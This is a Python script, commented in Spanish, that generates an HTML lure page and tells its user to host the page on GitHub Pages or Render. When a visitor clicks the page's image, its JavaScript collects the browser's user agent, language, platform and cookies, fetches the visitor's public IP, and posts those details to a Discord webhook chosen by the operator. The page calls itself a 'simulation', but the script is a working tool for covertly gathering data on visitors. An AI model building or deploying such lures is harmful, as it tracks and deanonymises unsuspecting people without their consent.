import os
import requests

# Pedir datos
webhook = input("Ingresa tu Webhook de Discord: ").strip()
imagen = input("Ruta de la imagen (JPG/PNG): ").strip()

# Subir la imagen a algún servicio público o asumir que ya tienes la URL
# Aquí solo usamos la ruta local como simulación para el <img src>

nombre_html = "index.html"
html = f"""
<!DOCTYPE html>
<html lang=\"es\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Conexión</title>
    <style>
        body {{
            background-color: black;
            color: red;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }}
        img {{
            width: 300px;
            border: 2px solid red;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <h1>Data Extraction Simulation</h1>
    <p>Click en la imagen para iniciar...</p>
    <img src=\"{imagen}\" onclick=\"extraer()\">

    <script>
        function extraer() {{
            let data = {{
                navegador: navigator.userAgent,
                idioma: navigator.language,
                plataforma: navigator.platform,
                cookies: document.cookie,
                ip: "Obteniendo..."
            }};

            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {{
                    data.ip = ipData.ip;

                    fetch("{webhook}", {{
                        method: "POST",
                        headers: {{"Content-Type": "application/json"}},
                        body: JSON.stringify({{content: "**Datos del navegador:**\n" + 
                            "> Navegador: " + data.navegador + "\n" +
                            "> Idioma: " + data.idioma + "\n" +
                            "> Plataforma: " + data.plataforma + "\n" +
                            "> IP: " + data.ip
                        }})
                    }});

                    alert("Datos enviados.");
                }});
        }}
    </script>
</body>
</html>
"""

with open(nombre_html, "w", encoding="utf-8") as f:
    f.write(html)

print(f"Archivo '{nombre_html}' generado. Sube el HTML y la imagen a GitHub Pages o Render.")
